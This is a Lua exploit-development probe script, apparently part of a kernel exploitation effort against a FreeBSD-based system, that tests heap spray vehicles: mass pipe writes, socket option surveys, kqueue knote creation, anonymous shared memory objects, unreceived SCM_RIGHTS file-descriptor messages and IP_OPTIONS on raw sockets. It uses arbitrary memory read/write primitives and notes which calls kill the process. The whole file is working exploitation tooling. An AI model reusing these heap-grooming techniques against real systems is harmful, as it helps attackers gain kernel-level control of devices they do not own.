-- CRASH_CLASS: LOW
-- PROBE 559b: Alternative spray vehicles (skip SysV IPC — 559a confirmed lethal)
--
-- SysV msgget(225) kills process. Test remaining candidates:
-- A) Pipe buffer spray
-- B) Socket options survey (SO_*, TCP, IPv6, IPv4)
-- C) kqueue knote spray (EVFILT_USER, EVFILT_TIMER)
-- D) SHM object spray
-- E) sendmsg cmsg spray (SCM_RIGHTS mass)
-- F) Semaphore (maybe also lethal — test carefully)

print("=== PROBE 559b: SPRAY ALTERNATIVES ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local Z = uint64(0)
local sc3   = mk(3)   -- read
local sc4   = mk(4)   -- write
local sc6   = mk(6)   -- close
local sc20  = mk(20)  -- getpid
local sc30  = mk(30)  -- accept (sendmsg=28, recvmsg=27)
local sc28  = mk(28)  -- sendmsg
local sc27  = mk(27)  -- recvmsg
local sc97  = mk(97)  -- socket
local sc105 = mk(105) -- setsockopt
local sc118 = mk(118) -- getsockopt
local sc135 = mk(135) -- socketpair
local sc362 = mk(362) -- kqueue
local sc363 = mk(363) -- kevent
local sc480 = mk(480) -- ftruncate
local sc482 = mk(482) -- shm_open
local sc542 = mk(542) -- pipe2

local pid = N(sc20())
print("pid=" .. pid)
io.flush()

-- ============================================================
-- A) PIPE BUFFER SPRAY
-- ============================================================
print("")
print("--- A: Pipe buffer spray ---")
io.flush()

-- Create pipe and test write sizes
local pipefds = memory.alloc(8)
local ok_p, rv_p = pcall(function() return sc542(uint64(pipefds), Z) end)
local pipe_rv = ok_p and N(rv_p) or -999
local prd = rd(pipefds) or -1
local pwr = rd(pipefds + 4) or -1
print(string.format("pipe2 rv=%d rd=%d wr=%d", pipe_rv, prd, pwr))

if prd >= 0 and pwr >= 0 then
    local wbuf = memory.alloc(0x4000)
    for off = 0, 0x3FFC, 4 do wd(wbuf + off, 0xCAFE0000 + off) end

    -- Test write sizes
    for _, sz in ipairs({64, 128, 256, 512, 1024, 4096, 8192, 16384}) do
        local ok_w, rv_w = pcall(function()
            return sc4(uint64(pwr), uint64(wbuf), uint64(sz))
        end)
        local wrv = ok_w and N(rv_w) or -999
        if wrv > 0 then
            print(string.format("  write(%d) = %d OK", sz, wrv))
        else
            print(string.format("  write(%d) = %d FAIL", sz, wrv))
            break
        end
    end

    -- Read back to drain
    local rbuf = memory.alloc(0x4000)
    local ok_r, rv_r = pcall(function()
        return sc3(uint64(prd), uint64(rbuf), uint64(0x4000))
    end)
    local rrv = ok_r and N(rv_r) or -999
    local tag = rb(rbuf) or 0
    print(string.format("  drain read=%d tag=0x%08X", rrv, tag))

    -- Mass pipe creation test (spray count)
    local pipe_count = 0
    local pipe_fds = {}
    for i = 1, 200 do
        local pf = memory.alloc(8)
        local ok_mp, rv_mp = pcall(function() return sc542(uint64(pf), Z) end)
        if ok_mp and N(rv_mp) == 0 then
            pipe_count = pipe_count + 1
            local r_fd = rd(pf) or -1
            local w_fd = rd(pf + 4) or -1
            pipe_fds[pipe_count] = {r_fd, w_fd}
            -- Write 128 bytes of controlled data
            pcall(function()
                sc4(uint64(w_fd), uint64(wbuf), uint64(128))
            end)
        else
            break
        end
    end
    print(string.format("  mass pipe: %d pipes created+filled", pipe_count))

    -- Close all
    for i = 1, pipe_count do
        pcall(function() sc6(uint64(pipe_fds[i][1])) end)
        pcall(function() sc6(uint64(pipe_fds[i][2])) end)
    end
    pcall(function() sc6(uint64(prd)) end)
    pcall(function() sc6(uint64(pwr)) end)
end
io.flush()

-- ============================================================
-- B) SOCKET OPTIONS SURVEY
-- ============================================================
print("")
print("--- B: Socket option survey ---")
io.flush()

-- AF_UNIX STREAM
local unix_fd = -1
do
    local ok, v = pcall(function() return sc97(uint64(1), uint64(1), Z) end)
    unix_fd = ok and N(v) or -1
end

-- AF_INET STREAM (TCP)
local tcp_fd = -1
do
    local ok, v = pcall(function() return sc97(uint64(2), uint64(1), uint64(6)) end)
    tcp_fd = ok and N(v) or -1
end

-- AF_INET6 DGRAM
local ipv6_fd = -1
do
    local ok, v = pcall(function() return sc97(uint64(28), uint64(2), Z) end)
    ipv6_fd = ok and N(v) or -1
end

-- AF_INET DGRAM
local udp_fd = -1
do
    local ok, v = pcall(function() return sc97(uint64(2), uint64(2), uint64(17)) end)
    udp_fd = ok and N(v) or -1
end

print(string.format("fds: unix=%d tcp=%d ipv6=%d udp=%d", unix_fd, tcp_fd, ipv6_fd, udp_fd))

local optbuf = memory.alloc(1024)

-- SOL_SOCKET options that do allocations
print("SOL_SOCKET (0xFFFF):")
local sol_opts = {
    {0x0001, 4, "SO_DEBUG"},
    {0x0004, 4, "SO_KEEPALIVE"},
    {0x0008, 4, "SO_DONTROUTE"},
    {0x0020, 4, "SO_BROADCAST"},
    {0x0080, 8, "SO_LINGER"},
    {0x0100, 4, "SO_OOBINLINE"},
    {0x0200, 4, "SO_REUSEPORT"},
    {0x0400, 4, "SO_TIMESTAMP"},
    {0x0800, 4, "SO_NOSIGPIPE"},
    {0x1001, 4, "SO_SNDBUF"},
    {0x1002, 4, "SO_RCVBUF"},
    {0x1005, 16, "SO_SNDTIMEO"},
    {0x1006, 16, "SO_RCVTIMEO"},
    {0x1007, 4, "SO_ERROR"},
    {0x1009, 4, "SO_TYPE"},
    {0x1014, 4, "SO_ACCEPTFILTER"},
    {0x1015, 4, "SO_LISTENQLIMIT"},
    {0x1017, 4, "SO_SETFIB"},
    {0x1019, 4, "SO_USER_COOKIE"},
    {0x101C, 4, "SO_DOMAIN"},
    {0x2001, 4, "SO_BINTIME"},
}

local test_fd = unix_fd >= 0 and unix_fd or tcp_fd
if test_fd >= 0 then
    for _, o in ipairs(sol_opts) do
        zero(optbuf, 256)
        wd(optbuf, 1)
        if o[2] == 8 then wd(optbuf + 4, 1) end
        local ok_s, rv_s = pcall(function()
            return sc105(uint64(test_fd), uint64(0xFFFF),
                uint64(o[1]), uint64(optbuf), uint64(o[2]))
        end)
        local srv = ok_s and N(rv_s) or -999
        if srv >= 0 then
            print(string.format("  %s(0x%04X,%dB) = OK", o[3], o[1], o[2]))
        end
    end
end
io.flush()

-- IP level options (IPPROTO_IP=0)
print("IPPROTO_IP(0) on UDP:")
if udp_fd >= 0 then
    local ip_opts = {
        {3, 4, "IP_HDRINCL"},
        {9, 4, "IP_TOS"},
        {10, 4, "IP_TTL"},
        {12, 8, "IP_MULTICAST_IF"},
        {6, 40, "IP_OPTIONS (40B)"},
        {34, 4, "IP_RECVTOS"},
        {35, 4, "IP_RECVTTL"},
        {36, 4, "IP_RECVIF"},
        {44, 4, "IP_ONESBCAST"},
        {21, 4, "IP_RECVDSTADDR"},
        {22, 4, "IP_SENDSRCADDR"},
    }
    for _, o in ipairs(ip_opts) do
        zero(optbuf, 256)
        wd(optbuf, 1)
        local ok_s, rv_s = pcall(function()
            return sc105(uint64(udp_fd), Z,
                uint64(o[1]), uint64(optbuf), uint64(o[2]))
        end)
        local srv = ok_s and N(rv_s) or -999
        if srv >= 0 then
            print(string.format("  %s(%d,%dB) = OK", o[3], o[1], o[2]))
        end
    end
end
io.flush()

-- TCP options (IPPROTO_TCP=6)
print("IPPROTO_TCP(6):")
if tcp_fd >= 0 then
    local tcp_opts = {
        {1, 4, "TCP_NODELAY"},
        {2, 4, "TCP_MAXSEG"},
        {4, 4, "TCP_NOOPT"},
        {8, 4, "TCP_NOPUSH"},
        {16, 4, "TCP_MD5SIG"},
        {32, 4, "TCP_FASTOPEN"},
        {64, 128, "TCP_FUNCTION_BLK(128B)"},
        {512, 4, "TCP_KEEPINIT"},
        {256, 4, "TCP_KEEPIDLE"},
        {128, 4, "TCP_KEEPINTVL"},
        {1024, 4, "TCP_KEEPCNT"},
    }
    for _, o in ipairs(tcp_opts) do
        zero(optbuf, 256)
        wd(optbuf, 1)
        local ok_s, rv_s = pcall(function()
            return sc105(uint64(tcp_fd), uint64(6),
                uint64(o[1]), uint64(optbuf), uint64(o[2]))
        end)
        local srv = ok_s and N(rv_s) or -999
        if srv >= 0 then
            print(string.format("  %s(%d,%dB) = OK", o[3], o[1], o[2]))
        end
    end
end
io.flush()

-- IPv6 options (IPPROTO_IPV6=41)
print("IPPROTO_IPV6(41):")
if ipv6_fd >= 0 then
    local ipv6_opts = {
        {6, 4, "IPV6_UNICAST_HOPS"},
        {8, 4, "IPV6_MULTICAST_IF"},
        {9, 4, "IPV6_MULTICAST_HOPS"},
        {10, 4, "IPV6_MULTICAST_LOOP"},
        {26, 4, "IPV6_V6ONLY"},
        {27, 4, "IPV6_PORTRANGE"},
        {36, 4, "IPV6_RECVTCLASS"},
        {61, 4, "IPV6_RECVPATHMTU"},
        {62, 4, "IPV6_USE_MIN_MTU"},
        {69, 4, "IPV6_DONTFRAG"},
        {73, 4, "IPV6_ORIGDSTADDR"},
        -- Retry sticky with minimal valid extension header (8 bytes min)
        {50, 8, "IPV6_DSTOPTS(8B)"},
        {49, 8, "IPV6_HOPOPTS(8B)"},
        {51, 8, "IPV6_RTHDR(8B)"},
        -- Try with different header format
        {50, 16, "IPV6_DSTOPTS(16B)"},
        {50, 24, "IPV6_DSTOPTS(24B)"},
    }

    for _, o in ipairs(ipv6_opts) do
        zero(optbuf, 256)
        if o[1] == 50 or o[1] == 49 or o[1] == 51 then
            -- Build valid extension header
            -- byte 0: next header (59=no next)
            -- byte 1: length in 8-byte units minus 1 (0 = 8 bytes total)
            local hdr_units = math.floor(o[2] / 8) - 1
            wd(optbuf, 59 + hdr_units * 256) -- nxt=59, len=hdr_units
            -- Pad with option type 1 (PadN)
            if o[2] > 2 then
                -- option type=1, len=o[2]-4
                wd(optbuf + 4, 1 + (o[2] - 6) * 256)
            end
        else
            wd(optbuf, 1)
        end

        local ok_s, rv_s = pcall(function()
            return sc105(uint64(ipv6_fd), uint64(41),
                uint64(o[1]), uint64(optbuf), uint64(o[2]))
        end)
        local srv = ok_s and N(rv_s) or -999
        if srv >= 0 then
            print(string.format("  %s(%d,%dB) = OK ★", o[3], o[1], o[2]))
        end
    end
end
io.flush()

-- Close sockets
for _, fd in ipairs({unix_fd, tcp_fd, ipv6_fd, udp_fd}) do
    if fd >= 0 then pcall(function() sc6(uint64(fd)) end) end
end

-- ============================================================
-- C) KQUEUE KNOTE SPRAY
-- ============================================================
print("")
print("--- C: kqueue knote spray ---")
io.flush()

local ok_kq, kq_fd = pcall(function() return sc362() end)
kq_fd = ok_kq and N(kq_fd) or -1
print("kqueue fd=" .. kq_fd)

if kq_fd >= 0 then
    -- struct kevent (FreeBSD): 32 bytes on amd64
    -- ident(8) filter(2) flags(2) fflags(4) data(8) udata(8)
    local kevbuf = memory.alloc(64)

    -- Test EVFILT_USER (-11 = 0xFFF5 as signed i16)
    local user_added = 0
    for i = 1, 50 do
        zero(kevbuf, 32)
        wq(kevbuf + 0, uint64(i))          -- ident
        -- filter=-11 flags=EV_ADD(1) packed as: lo16=filter, hi16=flags
        -- i16 -11 = 0xFFF5 → packed with flags=0x0001 → dword = 0x0001FFF5
        wd(kevbuf + 8, 0x0001FFF5)
        wd(kevbuf + 12, 0)                 -- fflags
        wq(kevbuf + 16, uint64(i * 100))   -- data
        wq(kevbuf + 24, uint64(0xBEEF0000 + i)) -- udata

        local ok_ke, rv_ke = pcall(function()
            return sc363(uint64(kq_fd), uint64(kevbuf), uint64(1), Z, Z, Z)
        end)
        local kerv = ok_ke and N(rv_ke) or -999
        if kerv >= 0 then
            user_added = user_added + 1
        else
            if user_added == 0 then
                print(string.format("  EVFILT_USER add failed: rv=%d", kerv))
            end
            break
        end
    end
    print(string.format("  EVFILT_USER: %d knotes added", user_added))

    -- Test EVFILT_TIMER (-7 = 0xFFF9)
    local timer_added = 0
    for i = 1, 20 do
        zero(kevbuf, 32)
        wq(kevbuf + 0, uint64(1000 + i))   -- ident
        wd(kevbuf + 8, 0x0001FFF9)          -- filter=EVFILT_TIMER, flags=EV_ADD
        wd(kevbuf + 12, 0)
        wq(kevbuf + 16, uint64(300000))     -- 5min timer (won't fire)
        wq(kevbuf + 24, Z)

        local ok_ke, rv_ke = pcall(function()
            return sc363(uint64(kq_fd), uint64(kevbuf), uint64(1), Z, Z, Z)
        end)
        local kerv = ok_ke and N(rv_ke) or -999
        if kerv >= 0 then
            timer_added = timer_added + 1
        else
            if timer_added == 0 then
                print(string.format("  EVFILT_TIMER add failed: rv=%d", kerv))
            end
            break
        end
    end
    print(string.format("  EVFILT_TIMER: %d knotes added", timer_added))

    -- Test mass kqueue creation (separate kqueues = separate knote pools)
    local kq_count = 0
    local kq_fds = {}
    for i = 1, 100 do
        local ok_k2, kfd = pcall(function() return sc362() end)
        if ok_k2 and N(kfd) >= 0 then
            kq_count = kq_count + 1
            kq_fds[kq_count] = N(kfd)
        else
            break
        end
    end
    print(string.format("  mass kqueue: %d created", kq_count))

    -- Close them
    for i = 1, kq_count do
        pcall(function() sc6(uint64(kq_fds[i])) end)
    end
    pcall(function() sc6(uint64(kq_fd)) end)
end
io.flush()

-- ============================================================
-- D) SHM OBJECT SPRAY
-- ============================================================
print("")
print("--- D: SHM object spray ---")
io.flush()

-- SHM_ANON=1, O_CREAT|O_RDWR=0x202
local shm_count = 0
local shm_fds = {}
for i = 1, 100 do
    local ok_s, sfd = pcall(function()
        return sc482(uint64(1), uint64(0x202), uint64(0x1B6))
    end)
    if ok_s and N(sfd) >= 0 then
        shm_count = shm_count + 1
        shm_fds[shm_count] = N(sfd)
        -- Set different sizes
        local sz = (i <= 20) and 128 or
                   (i <= 40) and 256 or
                   (i <= 60) and 512 or 1024
        pcall(function() sc480(uint64(N(sfd)), uint64(sz)) end)
    else
        break
    end
end
print(string.format("shm_open(SHM_ANON) x %d: OK", shm_count))

-- Close
for i = 1, shm_count do
    pcall(function() sc6(uint64(shm_fds[i])) end)
end
io.flush()

-- ============================================================
-- E) SENDMSG CMSG SPRAY (SCM_RIGHTS with many fds)
-- ============================================================
print("")
print("--- E: sendmsg cmsg spray ---")
io.flush()

-- Create socketpair
local spfds = memory.alloc(8)
local ok_sp, rv_sp = pcall(function()
    return sc135(uint64(1), uint64(1), Z, uint64(spfds))
end)
local sp_rv = ok_sp and N(rv_sp) or -999
local sp0 = rd(spfds) or -1
local sp1 = rd(spfds + 4) or -1
print(string.format("socketpair rv=%d fds=%d,%d", sp_rv, sp0, sp1))

if sp0 >= 0 and sp1 >= 0 then
    -- SCM_RIGHTS: each fd in cmsg = one kernel file* copy = allocation
    -- struct msghdr: name(8), namelen(4), pad(4), iov(8), iovlen(4), pad(4),
    --               control(8), controllen(4)
    -- struct cmsghdr: cmsg_len(4), cmsg_level(4), cmsg_type(4), then data
    -- SCM_RIGHTS: level=SOL_SOCKET=0xFFFF, type=1

    -- Create some fds to pass
    local pass_fds = {}
    for i = 1, 10 do
        local pf = memory.alloc(8)
        local ok_pp, rv_pp = pcall(function() return sc542(uint64(pf), Z) end)
        if ok_pp and N(rv_pp) == 0 then
            pass_fds[#pass_fds + 1] = rd(pf) or -1
            pass_fds[#pass_fds + 1] = rd(pf + 4) or -1
        end
    end
    print(string.format("  created %d fds to pass", #pass_fds))

    -- Build cmsg with all fds
    local nfds = math.min(#pass_fds, 16)
    local cmsg_data_len = nfds * 4
    local cmsg_len = 12 + cmsg_data_len  -- cmsghdr + data
    local cmsg_space = cmsg_len
    if cmsg_space % 8 ~= 0 then cmsg_space = cmsg_space + (8 - cmsg_space % 8) end

    local cmsg = memory.alloc(cmsg_space + 16)
    zero(cmsg, cmsg_space + 16)
    wd(cmsg, cmsg_len)        -- cmsg_len
    wd(cmsg + 4, 0xFFFF)     -- cmsg_level = SOL_SOCKET
    wd(cmsg + 8, 1)          -- cmsg_type = SCM_RIGHTS
    for i = 1, nfds do
        wd(cmsg + 12 + (i-1)*4, pass_fds[i])
    end

    -- Build iovec
    local dummy_data = memory.alloc(8)
    wd(dummy_data, 0x41414141)
    local iov = memory.alloc(16)
    wq(iov, uint64(dummy_data))
    wq(iov + 8, uint64(4))

    -- Build msghdr
    local msghdr = memory.alloc(64)
    zero(msghdr, 64)
    wq(msghdr + 0, Z)                -- msg_name = NULL
    wd(msghdr + 8, 0)                -- msg_namelen = 0
    wq(msghdr + 16, uint64(iov))     -- msg_iov
    wd(msghdr + 24, 1)               -- msg_iovlen = 1
    wq(msghdr + 32, uint64(cmsg))    -- msg_control
    wd(msghdr + 40, cmsg_space)      -- msg_controllen

    -- Send
    local ok_sm, rv_sm = pcall(function()
        return sc28(uint64(sp0), uint64(msghdr), Z)
    end)
    local smrv = ok_sm and N(rv_sm) or -999
    print(string.format("  sendmsg(%d fds) = %d", nfds, smrv))

    if smrv > 0 then
        -- Receive
        local rcmsg = memory.alloc(cmsg_space + 16)
        zero(rcmsg, cmsg_space + 16)
        local riov_data = memory.alloc(8)
        zero(riov_data, 8)
        local riov = memory.alloc(16)
        wq(riov, uint64(riov_data))
        wq(riov + 8, uint64(4))

        local rmsghdr = memory.alloc(64)
        zero(rmsghdr, 64)
        wq(rmsghdr + 16, uint64(riov))
        wd(rmsghdr + 24, 1)
        wq(rmsghdr + 32, uint64(rcmsg))
        wd(rmsghdr + 40, cmsg_space)

        local ok_rm, rv_rm = pcall(function()
            return sc27(uint64(sp1), uint64(rmsghdr), Z)
        end)
        local rmrv = ok_rm and N(rv_rm) or -999
        local rcmsg_len = rd(rcmsg) or 0
        local rcmsg_level = rb(rcmsg + 4) or 0
        local rcmsg_type = rd(rcmsg + 8) or 0
        print(string.format("  recvmsg = %d cmsg_len=%d level=0x%X type=%d",
            rmrv, rcmsg_len, rcmsg_level, rcmsg_type))

        -- Check received fds
        if rcmsg_type == 1 then
            local recv_fd_count = math.floor((rcmsg_len - 12) / 4)
            print(string.format("  received %d fds", recv_fd_count))
            -- Close received fds
            for i = 1, recv_fd_count do
                local rfd = rd(rcmsg + 12 + (i-1)*4) or -1
                if rfd >= 0 then pcall(function() sc6(uint64(rfd)) end) end
            end
        end

        -- NOW: mass send without receive = kernel holds fd refs
        -- This is the SPRAY: each unread SCM_RIGHTS creates kernel file* refs
        print("")
        print("  mass send test (no recv = kernel holds refs):")
        local mass_sent = 0
        for i = 1, 100 do
            -- Re-use same msghdr
            local ok_ms, rv_ms = pcall(function()
                return sc28(uint64(sp0), uint64(msghdr), Z)
            end)
            if ok_ms and N(rv_ms) > 0 then
                mass_sent = mass_sent + 1
            else
                print(string.format("  send %d failed (buffer full?)", i))
                break
            end
        end
        print(string.format("  sent %d msgs without recv (%d fds each = %d kernel refs)",
            mass_sent, nfds, mass_sent * nfds))
    end

    -- Cleanup
    for _, fd in ipairs(pass_fds) do
        pcall(function() sc6(uint64(fd)) end)
    end
    pcall(function() sc6(uint64(sp0)) end)
    pcall(function() sc6(uint64(sp1)) end)
end
io.flush()

-- ============================================================
-- F) IP_OPTIONS spray (variable-size kernel alloc!)
-- ============================================================
print("")
print("--- F: IP_OPTIONS spray test ---")
io.flush()

-- IP_OPTIONS creates a kernel mbuf copy of arbitrary data (up to 40 bytes)
-- This is a CLASSIC spray vehicle: controlled size (4-40 bytes) + controlled content
local raw_fd = -1
do
    local ok, v = pcall(function()
        return sc97(uint64(2), uint64(3), Z) -- AF_INET, SOCK_RAW, proto=0
    end)
    raw_fd = ok and N(v) or -1
end
print("raw socket fd=" .. raw_fd)

if raw_fd >= 0 then
    -- Test IP_OPTIONS (option 6 on IPPROTO_IP=0)
    local ipopt = memory.alloc(44)
    for _, sz in ipairs({4, 8, 12, 20, 28, 36, 40}) do
        zero(ipopt, 44)
        -- Fill with NOP (option 1) + pattern
        for off = 0, sz - 1 do
            wd(ipopt + off, 0x01010101) -- NOP options
        end
        local ok_s, rv_s = pcall(function()
            return sc105(uint64(raw_fd), Z, uint64(6),
                uint64(ipopt), uint64(sz))
        end)
        local srv = ok_s and N(rv_s) or -999
        print(string.format("  IP_OPTIONS(%dB) = %d", sz, srv))
    end
    pcall(function() sc6(uint64(raw_fd)) end)
elseif udp_fd < 0 then
    -- Try on a fresh UDP socket
    local ufd = -1
    do
        local ok, v = pcall(function()
            return sc97(uint64(2), uint64(2), uint64(17))
        end)
        ufd = ok and N(v) or -1
    end
    if ufd >= 0 then
        local ipopt = memory.alloc(44)
        zero(ipopt, 44)
        wd(ipopt, 0x01010101)
        local ok_s, rv_s = pcall(function()
            return sc105(uint64(ufd), Z, uint64(6), uint64(ipopt), uint64(4))
        end)
        print(string.format("  IP_OPTIONS on UDP = %d", ok_s and N(rv_s) or -999))
        pcall(function() sc6(uint64(ufd)) end)
    end
end
io.flush()

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 559b DONE ===")
